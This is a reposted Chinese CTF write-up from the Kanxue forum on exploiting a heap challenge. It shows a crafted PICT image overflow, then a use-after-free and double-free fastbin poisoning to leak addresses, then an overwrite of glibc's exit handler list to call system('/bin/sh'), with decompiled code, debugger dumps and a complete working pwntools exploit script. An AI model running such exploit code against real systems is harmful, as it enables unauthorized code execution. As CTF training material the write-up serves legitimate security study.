structexit_function_list{structexit_function_list*next; // 链表指针size_tidx; // 当前使用的索引structexit_functionfns[32]; // 函数数组（每个块32个函数）};structexit_function{longintflavor; // 函数类型标识union{void(*at) (void); // atexit函数指针struct{void(*fn) (intstatus,void*arg); // on_exit函数指针void*arg; // 用户参数 } on;struct{void(*fn) (void*arg,intstatus); // __cxa_atexit函数指针void*arg; // 用户参数void*dso_handle; // DSO句柄 } cxa; } func;};

case ef_cxa: // __cxa_atexit注册的函数（C++析构函数）/* To avoid dlclose/exit race calling cxafct twice (BZ 22180), we must mark this function as ef_free. *//* 为了避免dlclose/exit竞争条件导致cxafct被调用两次(BZ 22180)， 我们必须将此函数标记为ef_free */ f->flavor = ef_free; cxafct = f->func.cxa.fn; arg = f->func.cxa.arg;PTR_DEMANGLE(cxafct); // 解密函数指针/* Unlock the list while we call a foreign function. *//* 在调用外部函数时解锁列表 */ __libc_lock_unlock (__exit_funcs_lock);cxafct(arg, status); // 【PWN关键点】调用C++析构函数 __libc_lock_lock (__exit_funcs_lock);break;

#definePTR_MANGLE(var) (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)#definePTR_DEMANGLE(var) PTR_MANGLE (var)

0x7f4524b32f60<__run_exit_handlers+336> mov rcx, qword ptr [rax+0x18] RCX, [initial+24]=>0xfe8a4968348000000x7f4524b32f64<__run_exit_handlers+340> mov r8, qword ptr [rax+0x20] R8, [initial+32]=>0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */►0x7f4524b32f68<__run_exit_handlers+344> mov qword ptr [rax+0x10],0 [initial+16]<=00x7f4524b32f70<__run_exit_handlers+352> mov rax, rcx RAX=>0xfe8a4968348000000x7f4524b32f73<__run_exit_handlers+355> mov ecx, r12d ECX=>00x7f4524b32f76<__run_exit_handlers+358> ror rax,0x110x7f4524b32f7a<__run_exit_handlers+362> xor rax, qword ptr fs:[0x30] RAX=>0x7f4524b41a40(system) (0x7f4524b41a40^0x0

structexit_function_list{structexit_function_list*next; // 设置为0size_tidx; // 设置为1structexit_functionfns[32]; // 填充一个结构体，按照cxa去填充};structexit_function{ // cxa的结构体longintflavor; // 4void(*fn) (void*arg,intstatus); // 函数指针void*arg; // 参数指针void*dso_handle; // 随便设置};

pwndbg> tele 0x7f4524af278000:
0000│ fs_base 0x7f4524af2780 ◂— 0x7f4524af278001:
0008│ 0x7f4524af2788 —▸ 0x7f4524af3120 ◂— 102:
0010│ 0x7f4524af2790 —▸ 0x7f4524af2780 ◂— 0x7f4524af278003:
0018│ 0x7f4524af2798 ◂— 004:
0020│ 0x7f4524af27a0 ◂— 005:
0028│ 0x7f4524af27a8 ◂— 0xa9379609e4922e0006:
0030│ 0x7f4524af27b0 ◂— 007:
0038│ 0x7f4524af27b8 ◂— 0

pwndbg>binstcachebins0x60[ 0]:
0x33ea2de158f42a180x110[ 1]:
0x55a07ae54680◂—00x160[ 1]:
0x55a07ae54520◂—0

pwndbg>tele&initial00:
0000│ rax r150x7f4524cca1e0(initial) ◂—001:
0008│ 0x7f4524cca1e8(initial+8) ◂—002:
0010│ 0x7f4524cca1f0(initial+16) ◂—403:
0018│ 0x7f4524cca1f8(initial+24) ◂—0xfe8a49683480000004:
0020│ 0x7f4524cca200(initial+32) —▸0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */05:
0028│ 0x7f4524cca208(initial+40) ◂—'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

►0x7f4524b32f94<__run_exit_handlers+388>call rax <system> command:
0x7f4524c87ea4◂—0x68732f6e69622f/* '/bin/sh' */

6

完整exp

#!/usr/bin/env python3frompwncliimport*cli_script()set_remote_libc('libc.so.6')io: tube = gift.ioelf: ELF = gift.elflibc: ELF =gift.libcdefpack_data():
returnbytes([10,0xf0,0x0f,4]) +bytes([0,0xf0,0x0f,4])data = flat({# header check0:
bytes([0x53,0x80,0xF6,0x34]),0x58:b"PICT",0x5c:
p16(0x5500), # width big endian0x5e:
p16(0x100), # height big endian0x68:
bytes([0,8,0,0xf0]),# header info0x6c:
pack_data()*0x40},filler=b"x00")sz =len(data)ru(b"Enter image size in bytes: ")sl(str(sz).encode())sl(data)ru(b"yo face = ")num = rl()[:-1]success(f"num ={num}/ 4919")defcmd(i, prompt=b">> "): sla(prompt, i)defadd(idx, data): cmd('1') sla(b"order: ",str(idx).encode()) sla(b"describe ", data)#......defdele(idx): cmd('2') sla(b"throw? D: ",str(idx).encode())#......defshow(idx): cmd('31') sla(b"food where: ",str(idx).encode())#......add(0,b"A"*0x58)dele(0)show(0)ru(b"burgir[0]: ")heap_leak = r(8)heap_leak = u64(heap_leak)success(f"heap_leak ={hex(heap_leak)}")heap_base = (heap_leak <<12)-0x1000foriinrange(11): add(i,b"A"*0x58)foriinrange(7): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1): add(i,b"B"*0x58)dele(0)add(0,(pack((heap_base+0x1000)>>12))*11)add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)add(8,b"D"*0x58)add(7,b"E"*0x58)add(10,b"a"*0x58)dele(9)add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)dele(0)add(0,pack(0)+pack(0x421)+b"q"*0x48)add(9,pack(0)+pack(0x51) + pack(0) + pack(0x41) + pack(0)+ pack(0x31) + pack(0) + pack(0x21) + pack(0) + pack(0x11) + pack(0))dele(10)show(10)ru(b"burgir[10]: ")libc_leak = r(8)libc_leak = u64(libc_leak)success(f"libc_leak ={hex(libc_leak)}")libc.address = libc_leak - 0x1d3d00success(f"libc.address ={hex(libc.address)}") add(10,pack(0)*9+ pack(0x61) + pack(0))foriinrange(1,8,1): dele(i)dele(8)dele(9)dele(8)foriinrange(7,0,-1): add(i,b"B"*0x58)tls = libc.address -0x2880pg =0add(8,pack((tls+0x30)^((heap_base+0x1700)>>12))+b"C"*0x50)add(9,b"x"*0x30+pack(0x3f0)+pack(0x20)+pack(0)*3)add(8,b"x"*0x58)add(0,pack(0)+b"x00"*0x50)dele(1)add(1,pack(0)+pack(0x3f1)+pack(libc_leak)*2+pack(0)*7)foriinrange(0,9): add(i,b"A"*0x48)foriinrange(6,-1,-1): dele(i)dele(7)dele(8)dele(7)foriinrange(6,-1,-1): add(i,b"D"*0x48)add(7,pack((libc.sym.initial)^((heap_base+0x1620)>>12))+pack(0)*8)add(8,b"x"*0x48)add(7,b"x"*0x48)system = libc.sym.systembinsh =next(libc.search(b"/bin/shx00") )success(f"binsh ={hex(binsh)}")add(9,pack(0)+pack(1)+pack(4)+pack(system<<0x11)+pack(binsh)+b"x"*0x20)cmd(b"balabala")ia()

看雪ID：selph

https://bbs.kanxue.com/user-home-988863.htm

*本文为看雪论坛精华文章，由selph原创，转载请注明来自看雪社区

看雪·第九届安全开发者峰会（SDC 2025）

# 往期推荐

无”痕”加载驱动模块之傀儡驱动 (上)

为 CobaltStrike 增加 SMTP Beacon

隐蔽通讯常见种类介绍

buuctf-re之CTF分析

物理读写/无附加读写实验

球分享

球点赞

球在看

点击阅读原文查看更多


```
Arch:
amd64-64-littleRELRO:
FullRELROStack:
CanaryfoundNX:
NXenabledPIE:
PIEenabled
v47 = __readfsqword(0x28u);setbuf(stdin,0);setbuf(stderr,0);setbuf(stdout,0); random_seed =time(0); // 随机数srand(random_seed); privilege_value =4; modification_parameters = modification_parameters_1; privilege_pointer = &privilege_value;printf("Enter image size in bytes: ");if( !fgets(size_input_buffer,32, stdin) ) // 输入size {fwrite("Failed to read sizen",1u,0x14u, stderr);return1; } input_size =strtoul(size_input_buffer,0,10);// 转换成数字if( !input_size || input_size >0x10000) // 不能是0，不能>0x10000 {fprintf(stderr,"Bad size (1–%d)n",0x10000);return1; } allocated_buffer =malloc(input_size); // 分配内存if( !allocated_buffer ) {perror("malloc");return1; } bytes_read =read(0, allocated_buffer, input_size);if( bytes_read <=0) {perror("read");free(allocated_buffer);return1; } image_buffer = allocated_buffer; loaded_image_data = (char*)stbi_load_from_memory( (__int64)allocated_buffer, input_size, (unsignedint*)&image_width, (unsignedint*)&image_height, (__int64 *)&p_menu_choice_storage,3u, modification_parameters_1);if( loaded_image_data ) { center_x = (double)image_width /2.0; center_y = (double)image_height /2.0; max_distance =hypot(center_x, center_y); random_modification_index = (int)((double)rand() /2147483647.0*0.7*3.0+0.8);// 1 *(double*)&modification_parameters[random_modification_index /2+3] = (double)rand() /2147483647.0*0.2+0.1; *(double*)&modification_parameters[3* random_modification_index] = (double)rand() /2147483647.0*0.25+0.15;for( row_index =0; row_index < image_height; ++row_index ) { row_data_offset = &loaded_image_data[3* row_index * image_width];if( (row_index &1) !=0) row_color_value =220;else row_color_value =255; current_row_color = row_color_value;for( i =0; i < image_width; ++i ) { pixel_pointer = &row_data_offset[3* i]; distance_from_center =hypot((double)i - center_x, (double)row_index - center_y); normalized_distance = distance_from_center / max_distance; distance_factor =1.8* (1.0- distance_from_center / max_distance); random_value =rand(); *(double*)&modification_parameters[random_modification_index +4] =1.0 - *(double*)&modification_parameters[random_modification_index +1] * ((double)(unsigned__int8)random_value /127.0); *(double*)&modification_parameters[random_modification_index +1] = *(double*)&modification_parameters[random_modification_index +5] * ((double)BYTE1(random_value) /127.0) +1.0; *(double*)&modification_parameters[2* random_modification_index +1] =1.0 - *(double*)&modification_parameters[2* random_modification_index +3] * ((double)BYTE2(random_value) /127.0);if( (random_value &0x3FF) ==0) { *pixel_pointer ^=0x3Fu; pixel_pointer[1] ^=0x7Fu; pixel_pointer[2] = ~pixel_pointer[2]; } red_component =pow((double)(unsigned__int8)*pixel_pointer /255.0, (double)random_modification_index); processed_red = red_component * *(double*)&modification_parameters[random_modification_index +4]; green_component =pow((double)(unsigned__int8)pixel_pointer[1] /255.0, (double)random_modification_index); processed_green = *(double*)&modification_parameters[random_modification_index +5] * ((distance_factor +1.0) * green_component); blue_component =pow((double)(unsigned__int8)pixel_pointer[2] /255.0, (double)random_modification_index); processed_blue = blue_component * *(double*)&modification_parameters[random_modification_index +4]; clamped_red =fmin(processed_red,1.0); *pixel_pointer = (int)(clamped_red * (double)current_row_color); clamped_green =fmin(processed_green,1.0); pixel_pointer[1] = (int)(clamped_green * (double)current_row_color); clamped_blue =fmin(processed_blue,1.0); pixel_pointer[2] = (int)(clamped_blue * (double)current_row_color); *privilege_pointer ^= (unsigned__int8)(pixel_pointer[1] & *pixel_pointer) & (unsigned__int8)pixel_pointer[2] &0xF; } } *privilege_pointer |=7u; *privilege_pointer &=0x1FFFu; final_privilege_value = *privilege_pointer; *privilege_pointer =rand() &0x3F| final_privilege_value; temporary_buffer_1 =malloc(0x2F0u); temporary_buffer_2 =malloc(0x8F0u);stbi_image_free(loaded_image_data); privilege = *privilege_pointer !=4919; menu_format_string ="yo face = %dn";printf("yo face = %dn", *privilege_pointer);
privilege= *privilege_pointer !=4919;
*privilege_pointer ^= (unsigned__int8)(pixel_pointer[1] & *pixel_pointer) & (unsigned__int8)pixel_pointer[2] &0xF;
*privilege_pointer|=7u;*privilege_pointer&=0x1FFFu;final_privilege_value=*privilege_pointer;*privilege_pointer=rand()&0x3F|final_privilege_value;privilege=*privilege_pointer!=4919;
privilege_value=4;modification_parameters= modification_parameters_1;privilege_pointer= &privilege_value;
__int64 modification_parameters_1[10]; //[rsp+D0h][rbp-A0h]BYREF int privilege_value; //[rsp+120h][rbp-50h]BYREF char size_input_buffer[40]; //[rsp+130h][rbp-40h]BYREF
modification_parameters = modification_parameters_1;... loaded_image_data = (char*)stbi_load_from_memory( (__int64)allocated_buffer, input_size, (unsignedint*)&image_width, (unsignedint*)&image_height, (__int64 *)&p_menu_choice_storage,3u, modification_parameters_1);..。
__int64 __fastcallstbi_load_from_memory( __int64 buf,intsize,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, __int64 *modification_parameters){ __int64 v12[30];// [rsp+30h] [rbp-F0h] BYREF v12[29] = __readfsqword(0x28u);stbi__start_mem(v12, buf, size);returnstbi__load_and_postprocess_8bit((int)v12, p_j, p_i, p_menu_choice_storage, n3, modification_parameters);}
char*__fastcallstbi__load_and_postprocess_8bit(unsignedint*a1,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, __int64 *modification_parameters){unsignedintn3_1;// eaxboolv8;// alintn3_2;// eaxchar*main;// [rsp+40h] [rbp-20h]unsignedintp_n8[3];// [rsp+4Ch] [rbp-14h] BYREFunsigned__int64 v15;// [rsp+58h] [rbp-8h] v15 = __readfsqword(0x28u); main =stbi__load_main(a1, p_j, p_i, p_menu_choice_storage, n3, p_n8,8, modification_parameters);if( !main )return0;if( p_n8[0] !=8&& p_n8[0] !=16) __assert_fail("ri.bits_per_channel == 8 || ri.bits_per_channel == 16","stb_image.h",0x50Cu,"stbi__load_and_postprocess_8bit");if( p_n8[0] !=8) {if( n3 )...
char*__fastcallstbi__load_main(unsignedint*p_n4096,unsignedint*p_j,unsignedint*p_i, __int64 *p_menu_choice_storage,unsignedintn3, _DWORD *p_n8,intn8, __int64 *modification_parameters){unsignedintn3_1;// eaxvoid*v14;// [rsp+38h] [rbp-8h]memset(p_n8,0,0xCu); *p_n8 =8; p_n8[2] =0; p_n8[1] =0;if( (unsignedint)stbi__png_test(p_n4096, modification_parameters) )return(char*)stbi__png_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__bmp_test(p_n4096, modification_parameters) )returnstbi__bmp_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if(stbi__gif_test(p_n4096, modification_parameters) )return(char*)stbi__gif_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__psd_test(p_n4096, modification_parameters) )returnstbi__psd_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, n8, modification_parameters);if( (unsignedint)stbi__pic_test(p_n4096, modification_parameters) )return(char*)stbi__pic_load( p_n4096, p_j, p_i, (unsignedint*)p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__jpeg_test(p_n4096, modification_parameters) )return(char*)stbi__jpeg_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__pnm_test(p_n4096, modification_parameters) )returnstbi__pnm_load((int*)p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( (unsignedint)stbi__hdr_test(p_n4096, modification_parameters) ) { v14 =stbi__hdr_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);if( n3 ) n3_1 = n3;else n3_1 = *(_DWORD *)p_menu_choice_storage;return(char*)stbi__hdr_to_ldr(v14, *p_j, *p_i, n3_1); }elseif( (unsignedint)stbi__tga_test(p_n4096, modification_parameters) ) {return(char*)stbi__tga_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8); }else {stbi__err("unknown image type");return0; }}
if( !stbi__pic_load_core( file_data_ptr, image_width, image_height, local_format_ptr, (char*)loaded_image_data, image_modifications_ptr) ) {free(loaded_image_data); loaded_image_data =0; } *image_width_ptr = image_width; *image_height_ptr = image_height;if( !requested_components ) requested_components = *local_format_ptr; loaded_image_data = (void*)stbi__convert_format( loaded_image_data,4, requested_components, image_width, image_height);for( i =0; i <=10; ++i ) *(double*)&image_modifications_ptr[i] = image_noises[i];returnloaded_image_data;
if( mod_result >0) index_temp = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 不求反的情况 image_noises[index_temp] = noise_value + (double)(unsigned__int8)(buffer_ptr[1] ^ buffer_ptr[2]) *1.0e-16; buffer_ptr +=4; // 累加操作 }
if( (unsignedint)stbi__pic_test(p_n4096, modification_parameters) )return(char*)stbi__pic_load( p_n4096, p_j, p_i, (unsignedint*)p_menu_choice_storage, n3, p_n8, modification_parameters);
__int64 __fastcallstbi__pic_test(unsignedint*p_n4096, __int64 *modification_parameters){unsignedintv3;// [rsp+1Ch] [rbp-4h] v3 =stbi__pic_test_core(p_n4096, modification_parameters);stbi__rewind(p_n4096);returnv3;}_BOOL8 __fastcallstbi__pic_test_core(unsignedint*p_n4096, __int64 *modification_parameters){inti;// [rsp+1Ch] [rbp-4h]if( !(unsignedint)stbi__pic_is4(p_n4096, &PICT) )// 4个字节头校验：53 80 f6 34return0;for( i =0; i <=0x53; ++i )stbi__get8(p_n4096);return(unsignedint)stbi__pic_is4(p_n4096,"PICT") !=0;}
local_format_ptr = image_format_ptr; stack_canary_value = __readfsqword(0x28u);if( !image_format_ptr ) local_format_ptr = (unsignedint*)&temp_format_storage;for( header_skip_counter =0; header_skip_counter <=0x5B; ++header_skip_counter )stbi__get8((__int64 *)file_data_ptr); // 跳过header 92字节 image_width =stbi__get16be(file_data_ptr); // 16bit大端序 image_height =stbi__get16be(file_data_ptr); // 16bit大端序if( (int)image_height >4096|| (int)image_width >4096)// 不能超过4096gotoLABEL_12;if( (unsignedint)stbi__at_eof(file_data_ptr) ) {stbi__err("bad file");return0; }if( (unsignedint)stbi__mad3sizes_valid(image_width, image_height,4,0) ) {stbi__get32be(file_data_ptr); // 跳过8字节stbi__get16be(file_data_ptr);stbi__get16be(file_data_ptr); loaded_image_data = (void*)stbi__malloc_mad3(image_width, image_height,4u,0);// 分配内存if( loaded_image_data ) {memset(loaded_image_data,0xFF, (int)(4* image_height * image_width));if( !stbi__pic_load_core( file_data_ptr, image_width, image_height, local_format_ptr, (char*)loaded_image_data, image_modifications_ptr) )
*(_QWORD *)&buffer_ptr_1[4] = __readfsqword(0x28u); compression_flags =0; header_index =0;do {if( header_index ==10) {LABEL_3:
stbi__err("bad format");return0; } temp_int = header_index++; header_ptr = &header_data[3* temp_int]; // 3字节 header_type = (unsigned__int8)stbi__get8((__int64)data_stream);// 类型，为0的时候跳出结构 *header_ptr =stbi__get8((__int64)data_stream);// 需要是8，必须是8 header_ptr[1] =stbi__get8((__int64)data_stream); header_ptr[2] =stbi__get8((__int64)data_stream); compression_flags |= header_ptr[2];if( (unsignedint)stbi__at_eof(data_stream) ) {LABEL_54:
stbi__err("bad file");return0; }if( *header_ptr !=8)gotoLABEL_3; }while( header_type );if( (compression_flags &0x10) !=0) channel_count =4;else channel_count =3; *channels_out = channel_count; // 这个数据是返回的，后面处理不用，不用管
for( i =0; i < row_index; ++i ) {for( channel_index =0; channel_index < header_index; ++channel_index )// 1个通道头，就只执行一轮 { channel_header_ptr = &header_data[3* channel_index]; buffer_ptr = &output_buffer[4* width * i];if( channel_header_ptr[1] ==2) // 通道头 = 2 {... }else // 1或者0的情况 {if( (unsigned__int8)header_data[3* channel_index +1] >2u)// 只能是0 1 2gotoLABEL_3;if( header_data[3* channel_index +1] )// 1 的情况 {... }else // 0的情况 {for( copy_count =0; copy_count < width; ++copy_count )// 累加次数是width {if( !stbi__readval(data_stream, (unsigned__int8)channel_header_ptr[2], buffer_ptr) )// 需要读取的值不为0，读取4字节到buffer_ptrreturn0; mod_result = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 每次读取4字节，首字节相减求模11 neg_mod_result = -mod_result; // 求反if( mod_result >0) // 如果是大于0的值 neg_mod_result = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 就不进行求反，值是0-10的值，1010 noise_value = image_noises[neg_mod_result];// 原本的噪音// pwndbg> p $st0// $1 = 2 index_temp = -mod_result; // 索引是求反的值// 如果是-10，求反变成10，就能控制idx=10，溢出位所在if( mod_result >0) index_temp = ((unsigned__int8)*buffer_ptr - (unsigned__int8)*(buffer_ptr -4)) %11;// 不求反的情况 image_noises[index_temp] = noise_value + (double)(unsigned__int8)(buffer_ptr[1] ^ buffer_ptr[2]) *1.0e-16; buffer_ptr +=4; // 累加操作 } } } } }returnoutput_buffer;
bytes([10,0xf0,0x0f,4]) +bytes([0,0xf0,0x0f,4])
defpack_data():
returnbytes([10,0xf0,0x0f,4]) + bytes([0,0xf0,0x0f,4])data = flat({# header check0:
bytes([0x53,0x80,0xF6,0x34]),0x58:b"PICT",0x5c:
p16(0x5500), # width big endian0x5e:
p16(0x100), # height big endian0x68:
bytes([0,8,0,0xf0]),# header info0x6c:
pack_data()*0x40},filler=b"x00")sz = len(data)ru(b"Enter image size in bytes: ")sl(str(sz).encode())sl(data)ru(b"yo face = ")num = rl()[:-1]success(f"num = {num} / 4919")
[DEBUG] Received0x1bbytes: b'Enter image size in bytes: '[DEBUG] Sent0x4bytes: b'620n'[DEBUG] Sent0x26dbytes:
000000005380f634000000000000000000000000 │S··4│····│····│····│0000001000000000000000000000000000000000 │····│····│····│····│ *0000005000000000000000005049435400550001 │····│····│PICT│·U··│000000600000000000000000000800f0 0a f00f04 │····│····│····│····│0000007000f00f040a f00f0400f00f040a f00f04 │····│····│····│····│ *0000026000f00f040a f00f0400f00f040a │····│····│····│·│0000026d[DEBUG] Received0x26bytes: b'yo face = 4919n' b'=== restoaurnat ===n' b'>> '[+] num = b'4919'/4919
while(1) {while(1) {menu(menu_format_string); menu_format_string ="%d";if( (unsignedint)__isoc99_scanf("%d", &choice) !=1) {puts("Invalid input!");exit(1); }if( choice !=31)break;if( privilege )gotoLABEL_39;do_show(); // 检查chunk指针，打印8字节 }if( choice >31)gotoLABEL_42;if( choice ==17) {puts("Here's a dollar go get yoself a mggaga");gotoLABEL_42; }if( choice >17)gotoLABEL_42;if( choice ==1) {if( privilege )gotoLABEL_39;do_alloc(); // 申请，填充数据，只能申请2次 }elseif( choice ==2) {if( privilege ) {LABEL_39: menu_format_string ="You have to be a pwn monk to order";puts("You have to be a pwn monk to order"); }else {do_delete("%d"); // 存在未清空的指针 } }else {LABEL_42: menu_format_string ="Invalid choice!";puts("Invalid choice!"); } } } error_message = (constchar*)stbi_failure_reason(image_buffer);printf("Error loading image: %sn", error_message);return1;
unsigned__int64 __fastcalldo_alloc(){unsignedintidx;// [rsp+Ch] [rbp-84h] BYREFsize_tsize;// [rsp+10h] [rbp-80h]void*s;// [rsp+18h] [rbp-78h] _BYTE buf[104];// [rsp+20h] [rbp-70h] BYREFunsigned__int64 v5;// [rsp+88h] [rbp-8h] v5 = __readfsqword(0x28u);printf("order: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA) {printf("describe ");getchar(); size =read(0, buf,0x5Fu); // 长度取决于输入长度if( (__int64)size >0) // 读取的长度 {if( buf[size -1] ==10) // 最后一个是n，就忽略 --size;if( size && (__int64)size <=0x5F) // 长度<=0x5f {if( size != sizes[allowed] ) // 数组，size不同就设置到数组里 sizes[++allowed] = size; // 从1开始if( allowed <=2) // 前2个 { s =malloc(size); // 申请内存if( !s )exit(1);memset(s,0,8u);memcpy(s, buf, size); // 复制 chunks[idx] = (__int64)s; // 设置指针puts("big chungus."); }else {puts("You ate too much and pooped yoself"); } } } }returnv5 - __readfsqword(0x28u);}
unsigned__int64 __fastcalldo_delete(){unsignedintidx;// [rsp+4h] [rbp-Ch] BYREFunsigned__int64 v2;// [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u);printf("throw? D: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA)free((void*)chunks[idx]); // UAF，Double-Freereturnv2 - __readfsqword(0x28u);}
unsigned__int64 __fastcalldo_show(){unsignedintidx;// [rsp+4h] [rbp-Ch] BYREFunsigned__int64 v2;// [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u);printf("food where: ");if( (unsignedint)__isoc99_scanf("%d", &idx) ==1&& idx <=0xA)// 输入 1~10 {printf("burgir[%d]: ", idx);if( chunks[idx] ) // 指针存在，就打印8字节write(1, (constvoid*)chunks[idx],8u); }returnv2 - __readfsqword(0x28u);}
defcmd(i, prompt=b">> "):
sla(prompt, i)defadd(idx, data):
cmd('1')sla(b"order: ",str(idx).encode())sla(b"describe ", data) #......defdele(idx):
cmd('2')sla(b"throw? D: ",str(idx).encode()) #......defshow(idx):
cmd('31')sla(b"food where: ",str(idx).encode()) #......
add(0,b"A"*0x58)dele(0)show(0)ru(b"burgir[0]: ")heap_leak = r(8)heap_leak = u64(heap_leak)success(f"heap_leak = {hex(heap_leak)}")heap_base = (heap_leak << 12 )- 0x1000
if((unsignedlong) (nb) <= (unsignedlong) (get_max_fast()))/* fastbin 尺寸 */ { idx =fastbin_index(nb);/* 计算对应 fastbin 索引 */ mfastbinptr *fb = &fastbin(av, idx);/* 获取该 fastbin 的链表头指针 */ mchunkptr pp; victim = *fb;/* 候选块：链表当前头 */if(victim !=NULL)/* fastbin 非空：尝试取出 */ {if(__glibc_unlikely (misaligned_chunk(victim)))malloc_printerr("malloc(): unaligned fastbin chunk detected 2");/* 保护性检查：头地址未按对齐 */if(SINGLE_THREAD_P) *fb =REVEAL_PTR(victim->fd);/* 单线程：解密指针得到fd地址 */elseREMOVE_FB(fb, pp, victim);/* 多线程情况 */if(__glibc_likely (victim !=NULL)) {size_tvictim_idx =fastbin_index(chunksize(victim));if(__builtin_expect (victim_idx != idx,0))malloc_printerr("malloc(): memory corruption (fast)");/* 块大小与bin不匹配：内存损坏 */check_remalloced_chunk(av, victim, nb);#ifUSE_TCACHE/* While we're here, if we see other chunks of the same size, stash them in the tcache. */size_ttc_idx =csize2tidx(nb);	/* 获取tcache索引 */if(tcache !=NULL&& tc_idx < mp_.tcache_bins)	/* tcachebin 没填满就往下走 */ { mchunkptr tc_victim;/* While bin not empty and tcache not full, copy chunks. */while(tcache->counts[tc_idx] < mp_.tcache_count	/* 直到填满为止 */ && (tc_victim = *fb) !=NULL) {if(__glibc_unlikely (misaligned_chunk(tc_victim)))	/* 保护性检查：头地址对齐 */malloc_printerr("malloc(): unaligned fastbin chunk detected 3");if(SINGLE_THREAD_P) *fb =REVEAL_PTR(tc_victim->fd);/*解密tcachebin chunk fd指针*/else {REMOVE_FB(fb, pp, tc_victim);if(__glibc_unlikely (tc_victim ==NULL))break; }tcache_put(tc_victim, tc_idx);	/*放入 tcachebin */ } }#endifvoid*p =chunk2mem(victim);/* 从chunk头换算用户指针 */alloc_perturb(p, bytes);/* 可选扰动填充，帮助发现越界 */returnp;/* fastbin 命中直接返回 */ } } }
unsignedintidx =fastbin_index(size); fb = &fastbin(av, idx); // 取出 fastbin 第一个 chunk/* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2;if(SINGLE_THREAD_P) {/* Check that the top of the bin is not the record we are going to add (i.e., double free). */if(__builtin_expect (old == p,0))// 检查和fastbin第一个chunk是否相同，相同则认为发生了 double freemalloc_printerr("double free or corruption (fasttop)"); p->fd =PROTECT_PTR(&p->fd, old); // 加密指针，存入 *fb = p; }
0x5643909ab380 0x0000000000000000 0x0000000000000061 ........a.......0x5643909ab390 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3a0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3b0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3c0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3d0 0x00000005643909ab 0x00000005643909ab ..9d......9d....0x5643909ab3e0 0x00000005643909ab 0x0000000000000061 ..9d....a..........0x5643909ab620 0x4242424242424242 0x0000000000000061 BBBBBBBBa....... <-- fastbins[0x60][0], fastbins[0x60][0]0x5643909ab630 0x00005646f4a3bf2b 0x4141414141414141 +...FV..AAAAAAAA0x5643909ab640 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab650 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab660 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab670 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab680 0x4141414141414141 0x0000000000000061 AAAAAAAAa....... <-- fastbins[0x60][1]0x5643909ab690 0x00005646f4a3bf8b 0x4141414141414141 ....FV..AAAAAAAA0x5643909ab6a0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6b0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6c0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6d0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab6e0 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab6f0 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab700 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab710 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab720 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab730 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab740 0x4141414141414141 0x0000000000000061 AAAAAAAAa.......0x5643909ab750 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab760 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab770 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab780 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab790 0x4141414141414141 0x4141414141414141 AAAAAAAAAAAAAAAA0x5643909ab7a0 0x4141414141414141 0x000000000001f861 AAAAAAAAa....... <--Topchunk
